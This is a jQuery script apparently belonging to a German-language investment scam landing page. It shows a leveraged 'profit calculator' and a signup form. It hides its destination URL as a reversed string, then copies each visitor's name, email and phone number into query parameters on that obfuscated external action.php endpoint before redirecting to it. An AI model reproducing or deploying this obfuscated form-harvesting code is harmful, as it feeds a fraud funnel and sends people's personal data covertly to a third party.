var get_vars = '';
var go_url = 'oi.buhtig.122reppohsffuts=ps?php.noitca/e/ten.ndc-dw//:sptth';
var page_url = 'stuffshopper221.github.io';
var new_url = go_url.split("").reverse().join("");

$(document).ready(function() {

});

$('#investment, #gain, #leverage').change(function() {
	result = $('#investment').val()*0 + $('#investment').val() * ($('#gain').val() / 100) * $('#leverage').val();
	$('#profit').html(format_number(result));
});

$('#investment, #gain, #leverage').blur(function() {
	result = $('#investment').val()*0 + $('#investment').val() * ($('#gain').val() / 100) * $('#leverage').val();
	$('#profit').html(format_number(result));
});

$('.btn-cta').click(function(e) {
	e.preventDefault();
	$('#overlay').removeClass('hidden');
	$('body').css('overflow', 'hidden');
});

$('.close-overlay').click(function(e) {
	e.preventDefault();
	$('#overlay').addClass('hidden');
	$('body').css('overflow', 'auto');
});

$('#signup-btn').click(function(e) {
	
	if(
		$('#activation').prop('checked') == false ||
		$('#first_name').val() == '' ||
		$('#last_name').val() == '' ||
		$('#email').val() == '' ||
		$('#phone').val() == ''
		)
	{
		e.preventDefault();
		alert('Bitte füllen Sie das Formular vollständig aus');
	}
	else
	{
		$('#signup-form').addClass('hidden');
		$('#signup-load').removeClass('hidden');
		$('#broker-title').addClass('hidden');

		setTimeout(function() {
			$('iframe').removeClass('hidden');
			$('iframe').css('z-index', '5');
		}, 5000);
	}
});

$('#activation').click(function() {
	get_vars = '&first_name=' + $('#first_name').val() + '&last_name=' + $('#last_name').val() + '&email=' + $('#email').val() + '&country_code=49&phone=' + $('#phone').val();
	$('#signup-btn').attr('href', new_url + get_vars);
});

function format_number(num) 
{
	return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
}
